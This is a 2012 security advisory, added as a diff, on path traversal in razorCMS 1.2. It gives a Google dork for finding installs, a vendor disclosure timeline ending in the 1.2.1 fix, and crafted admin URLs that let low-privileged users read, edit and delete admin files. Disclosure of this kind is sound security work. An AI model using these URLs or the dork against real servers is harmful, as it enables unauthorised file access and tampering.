@@ -1,0 +1,71 @@
+# Exploit Title: razorCMS 1.2 Path Traversal
+# Google Dork: "Powered by razorCMS"
+# Date: January 10, 2012
+# Author: chap0
+# Software Link: http://www.razorcms.co.uk/archive/core/
+# Version: 1.2
+# Tested on: Ubuntu
+# Patch: Upgrade to latest release 1.2.1
+# Greetz To: <Insert Name Here>
+
+RazorCMS is vulnerable to Path Traversal, when logged in with
+a least privileged user account the user can access the 
+administrator's and super administrator's directories and 
+files by changing the path in the url. The vulnerabilities exist
+in admin_func.php
+
+Patch Time line:
+Dec 11, 2011 - Contacted Vendor
+Dec 11, 2011 - Vendor Replied ask for details of vulnerability
+Dec 12, 2011 - Submitted details
+Dec 13, 2011 - No reply asked for an update
+Dec 13, 2011 - Vendor Replied asking for a week or two for a fix after the holiday period
+Dec 20, 2011 - Emailed Vendor for an update 
+Dec 21, 2011 - Vendor confirmed vulnerabilities asked for two weeks time for a fix
+Dec 27, 2011 - Emailed vendor some "temp fixes" for the vulnerabilities discovered
+Jan  3, 2012 - Emailed vendor more "temp fixes"
+Jan  5, 2012 - Vendor replied sent a new updated file v1 admin_func.php
+Jan  5, 2012 - Replied to vendor discovered more vulnerabilities
+Jan  6, 2012 - Vendor response with new file with fixes v2 admin_func.php
+Jan  6, 2012 - Tested discovered more vulnerabilities 
+Jan  8, 2012 - Vendor replied with new file v3 admin_func.php
+Jan  8, 2012 - Tested, vulnerabilities are fixed reported to vendor
+Jan  9, 2012 - Vendor released update 1.2.1
+Jan 10, 2012 - Public Disclosure
+
+Path Traversal Details:
+
+The following files and directories are vulnerable to Path Traversal
+Attack including any files or directories that the admin or super admin
+may create within these directories
+
+http://razorcms-server/admin/?action=filemanview&dir=razor_temp_logs/
+http://razorcms-server/admin/?action=filemanview&dir=backup/
+http://razorcms-server/admin/?action=filemanview&dir=/razor_data.txt
+http://razorcms-server/admin/?action=filemanview&dir=/index.htm
+
+
+http://razorcms-server/admin/?action=fileman&dir=razor_temp_logs/
+http://razorcms-server/admin/?action=fileman&dir=backup/
+http://razorcms-server/admin/?action=fileman&dir=/razor_data.txt
+http://razorcms-server/admin/?action=fileman&dir=/index.htm
+
+
+An example would be if the super admin created a directory within razor_temp_logs
+named sekrit which should not be accessible with a least privileged user, the 
+least privileged user can change the path as shown below:
+
+http://razorcms-server/admin/?action=filemanview&dir=razor_temp_logs/sekrit/
+
+Which also works on files within those directories which the user should not have
+access to which at this point gives the user access to view, edit, rename, move,
+copy and delete the file.
+
+e.g.
+
+http://razorcms-server/admin/?action=filemanview&dir=razor_temp_logs/sekrit/sekrit.txt
+
+
+Another vulnerability exist in this version of razorCMS, if a least privileged user creates
+a directory with their logged in credentials, and then deletes the directory, the user will 
+then have access to the administrative directories and files.
